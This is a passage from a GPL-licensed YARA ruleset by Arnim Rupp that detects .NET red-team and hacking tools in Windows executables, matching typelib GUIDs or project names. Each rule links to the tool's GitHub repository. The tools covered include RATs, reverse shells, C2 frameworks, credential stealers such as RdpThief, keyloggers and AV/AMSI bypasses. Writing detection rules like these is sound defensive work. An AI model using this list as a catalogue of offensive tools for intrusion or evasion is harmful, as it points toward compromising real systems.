them\n}\n\nrule HKTL_NET_GUID_SharpSvc {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpSvc\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"52856b03-5acd-45e0-828e-13ccb16942d1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCrashEventLog {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/slyd0g/SharpCrashEventLog\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"98cb495f-4d47-4722-b08f-cefab2282b18\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DotNetToJScript_LanguageModeBreakout {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/DotNetToJScript-LanguageModeBreakout\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"deadb33f-fa94-41b5-813d-e72d8677a0cf\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharPermission {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mitchmoser/SharPermission\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"84d2b661-3267-49c8-9f51-8f72f21aea47\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RegistryStrikesBack {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/RegistryStrikesBack\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"90ebd469-d780-4431-9bd8-014b00057665\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_CloneVault {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mdsecactivebreach/CloneVault\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"0a344f52-6780-4d10-9a4a-cb9439f9d3de\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_donut {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/donut\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"98ca74c7-a074-434d-9772-75896e73ceaa\" ascii nocase wide\n        $typelibguid1 = \"3c9a6b88-bed2-4ba8-964c-77ec29bf1846\" ascii nocase wide\n        $typelibguid2 = \"4fcdf3a3-aeef-43ea-9297-0d3bde3bdad2\" ascii nocase wide\n        $typelibguid3 = \"361c69f5-7885-4931-949a-b91eeab170e3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpHandler {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jfmaes/SharpHandler\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"46e39aed-0cff-47c6-8a63-6826f147d7bd\" ascii nocase wide\n        $typelibguid1 = \"11dc83c6-8186-4887-b228-9dc4fd281a23\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Driver_Template {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/Driver-Template\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"bdb79ad6-639f-4dc2-8b8a-cd9107da3d69\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_NashaVM {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Mrakovic-ORG/NashaVM\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"f9e63498-6e92-4afd-8c13-4f63a3d964c3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or\n    organization, as long as you use it under this license.\n*/\n\n\n// low hanging fruits ;)\n\nrule HKTL_NET_NAME_FakeFileMaker {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/FakeFileMaker\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"FakeFileMaker\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_Aggressor {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/k8gege/Aggressor\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Aggressor\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_pentestscripts {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/c4bbage/pentestscripts\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"pentestscripts\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_WMIPersistence {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/mdsecactivebreach/WMIPersistence\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"WMIPersistence\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_ADCollector {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/dev-2null/ADCollector\"\n        hash = \"5391239f479c26e699b6f3a1d6a0a8aa1a0cf9a8\"\n        hash = \"9dd0f322dd57b906da1e543c44e764954704abae\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ADCollector\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_MaliciousClickOnceGenerator {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Mr-Un1k0d3r/MaliciousClickOnceGenerator\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"MaliciousClickOnceGenerator\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_directInjectorPOC {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/badBounty/directInjectorPOC\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"directInjectorPOC\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_AsStrongAsFuck {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Charterino/AsStrongAsFuck\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"AsStrongAsFuck\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_MagentoScanner {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/soufianetahiri/MagentoScanner\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"MagentoScanner\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RevengeRAT_Stub_CSsharp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/NYAN-x-CAT/RevengeRAT-Stub-CSsharp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RevengeRAT-Stub-CSsharp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharPyShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/antonioCoco/SharPyShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharPyShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_GhostLoader {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/TheWover/GhostLoader\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"GhostLoader\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_DotNetInject {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/dtrizna/DotNetInject\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"DotNetInject\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_ATPMiniDump {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/b4rtik/ATPMiniDump\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ATPMiniDump\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_ConfuserEx {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/yck1509/ConfuserEx\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ConfuserEx\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpBuster {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/passthehashbrowns/SharpBuster\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpBuster\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_AmsiBypass {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/0xB455/AmsiBypass\"\n\t\thash = \"8fa4ba512b34a898c4564a8eac254b6a786d195b\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"AmsiBypass\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_Recon_AD {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/outflanknl/Recon-AD\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Recon-AD\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpWatchdogs {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/RITRedteam/SharpWatchdogs\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpWatchdogs\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpCat {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Cn33liz/SharpCat\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpCat\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_aspnetcore_bypassing_authentication {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/jackowild/aspnetcore-bypassing-authentication\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"aspnetcore-bypassing-authentication\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_K8tools {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/k8gege/K8tools\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"K8tools\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_HTTPSBeaconShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/limbenjamin/HTTPSBeaconShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"HTTPSBeaconShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_Ghostpack_CompiledBinaries {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/r3motecontrol/Ghostpack-CompiledBinaries\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Ghostpack-CompiledBinaries\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_metasploit_sharp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/VolatileMindsLLC/metasploit-sharp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"metasploit-sharp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_trevorc2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/trustedsec/trevorc2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"trevorc2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_petaqc2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/fozavci/petaqc2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"petaqc2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_DNS2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_DNS2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_DNS2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_cve_2017_7269_tool {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/zcgonvh/cve-2017-7269-tool\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"cve-2017-7269-tool\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_AggressiveProxy {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/EncodeGroup/AggressiveProxy\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"AggressiveProxy\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_MSBuildAPICaller {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/rvrsh3ll/MSBuildAPICaller\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"MSBuildAPICaller\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_GrayKeylogger {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DarkSecDevelopers/GrayKeylogger\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"GrayKeylogger\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_weevely3 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/epinna/weevely3\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"weevely3\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_FudgeC2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Ziconius/FudgeC2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"FudgeC2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_Reverse_tcp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_Reverse_tcp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_Reverse_tcp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpHose {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/ustayready/SharpHose\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpHose\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RAT_NjRat_0_7d_modded_source_code {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/AliBawazeEer/RAT-NjRat-0.7d-modded-source-code\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RAT-NjRat-0.7d-modded-source-code\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RdpThief {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/0x09AL/RdpThief\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RdpThief\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RunasCs {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/antonioCoco/RunasCs\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RunasCs\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_IP6DNS {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_IP6DNS\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_IP6DNS\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_ARP {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_ARP\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_ARP\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_C2Bridge {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/cobbr/C2Bridge\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"C2Bridge\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_Infrastructure_Assessment {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/NyaMeeEain/Infrastructure-Assessment\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Infrastructure-Assessment\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_shellcodeTester {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/tophertimzen/shellcodeTester\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"shellcodeTester\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_gray_hat_csharp_code {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/brandonprry/gray_hat_csharp_code\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"gray_hat_csharp_code\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_ReverseShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_ReverseShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_ReverseShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_DotNetAVBypass {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/mandreko/DotNetAVBypass\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"DotNetAVBypass\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_HexyRunner {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/bao7uo/HexyRunner\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"HexyRunner\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpOffensiveShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/darkr4y/SharpOffensiveShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpOffensiveShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_reconness {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/reconness/reconness\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"reconness\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_tvasion {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/loadenmb/tvasion\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"tvasion\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_ibombshell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Telefonica/ibombshell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ibombshell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RemoteProcessInjection {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Mr-Un1k0d3r/RemoteProcessInjection\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RemoteProcessInjection\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_njRAT_0_7d_Stub_CSharp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/NYAN-x-CAT/njRAT-0.7d-Stub-CSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        